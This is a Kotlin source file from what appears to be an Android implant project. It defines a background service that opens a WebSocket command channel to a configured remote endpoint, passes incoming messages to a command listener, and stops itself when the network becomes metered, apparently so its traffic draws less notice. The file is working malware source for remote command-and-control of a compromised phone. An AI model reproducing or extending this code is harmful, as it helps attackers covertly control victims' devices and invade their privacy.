package com.cooperthecoder.implant.command

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.*
import android.util.Log
import com.cooperthecoder.implant.App
import com.cooperthecoder.implant.Config
import com.cooperthecoder.implant.Networking
import okhttp3.Request
import okhttp3.WebSocket
import java.util.concurrent.TimeUnit

class CommandService : Service() {

    companion object {
        val TAG = CommandService::class.java.name
        const val WORKER_THREAD_NAME = "MeteredConnectionWorker"
        const val SOCKET_CLOSE = 1000
        val HEARTBEAT_INTERVAL = TimeUnit.SECONDS.toMillis(10)

        fun intent(context: Context): Intent {
            val intent = Intent(context, CommandService::class.java)
            return intent
        }
    }


    private var webSocket: WebSocket? = null
    val commandListener = CommandListener(this)

    lateinit var connectionHandler: Handler
    lateinit var mainHandler: Handler

    val meteredNetworkTask = Runnable {
        this@CommandService.onMeteredConnection()
    }

    val checkMeteredTask = Runnable {
        do {
            // Avoid using up 100% CPU
            Thread.sleep(HEARTBEAT_INTERVAL)
            Log.d(TAG, "Checking if network is still unmetered.")
        } while (Networking.isUnmeteredNetwork(this))
        Log.d(TAG, "Metered network detected.")
        mainHandler.post(meteredNetworkTask)
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        if (!commandListener.isRunning()) {
            Log.d(TAG, "Opening websocket")
            openCommandChannel()
        } else {
            Log.d(TAG, "Websocket connection already open.")
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        closeCommandChannel()
        super.onDestroy()
    }

    private fun openCommandChannel() {
        val request = Request.Builder()
                .url(Config.WEBSOCKETS_ENDPOINT)
                .build()

        webSocket = (application as App).httpClient.newWebSocket(request, commandListener)
        val connectivityThread = HandlerThread(WORKER_THREAD_NAME)
        connectivityThread.start()
        val looper = connectivityThread.looper
        connectionHandler = Handler(looper)
        mainHandler = Handler(mainLooper)
        connectionHandler.post(checkMeteredTask)

    }


    private fun closeCommandChannel() {
        webSocket?.close(SOCKET_CLOSE, null)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            connectionHandler.looper.quitSafely()
        } else {
            connectionHandler.looper.quit()
        }
    }

    private fun onMeteredConnection() {
        Log.d(TAG, "Network is metered. Stopping CommandService.")
        stopSelf()
    }
}

